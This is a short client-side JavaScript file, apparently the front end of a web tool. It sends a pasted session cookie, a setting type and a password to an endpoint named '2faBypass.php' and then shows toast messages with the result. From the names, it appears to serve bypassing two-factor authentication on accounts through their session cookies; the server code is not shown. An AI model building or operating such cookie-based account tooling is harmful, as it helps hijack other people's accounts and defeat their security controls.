
  const selectBox = document.getElementById("type");

  selectBox.addEventListener("change", function () {
    if(this.value == "Age") {
	document.getElementById("PassWBlock").style.display="block"
    }
    else {
	document.getElementById("PassWBlock").style.display="none"
    }
  });



document.getElementById('submit').onclick = async () => {
    try {
      document.querySelector("#result").value = "Please Wait..."
      const _0x4fa069 = await fetch(window.location.origin + '/api/misc/2faBypass.php', {
        'method': 'POST',
        'headers': {
          'Content-Type': 'application/json'
        },
        'body': JSON.stringify({"Cookie":document.querySelector('#inputCookie').value,"Type":document.querySelector('#type').value,"Password":document.querySelector('#password').value})
      });
      if (!_0x4fa069.ok) {
        throw new Error("Request failed with status code " + _0x4fa069.status);
      }
      const _0x4e0364 = await _0x4fa069.json();
      if(!_0x4e0364.success) {
            Toastify({
                'text': _0x4e0364.msg,
                'duration': 5000,
                'newWindow': true,
                'gravity': 'top',
                'position': 'center',
                'stopOnFocus': true,
                'style': {
                'background': '#ef4444',
                'text': 'white',
                'border-radius': '5px'
                }
            }).showToast();
            document.querySelector("#result").value = _0x4e0364.msg
        }
        else {
            Toastify({
                'text': "Success!",
                'duration': 5000,
                'newWindow': true,
                'gravity': 'top',
                'position': 'center',
                'stopOnFocus': true,
                'style': {
                'background': '#22c55e',
                'text': 'white',
                'border-radius': '5px'
                }
            }).showToast();  
            document.querySelector("#result").value = _0x4e0364.msg
        }
    } catch (_0x560fcd) {
      alert(_0x560fcd);
      Toastify({
        'text': "Error fetching. Try again later...",
        'duration': 5000,
        'newWindow': true,
        'gravity': 'top',
        'position': 'center',
        'stopOnFocus': true,
        'style': {
          'background': '#ef4444',
          'text': 'white',
          'border-radius': '5px'
        }
      }).showToast();
      console.error("Error updating cookie:", _0x560fcd);
    }
  };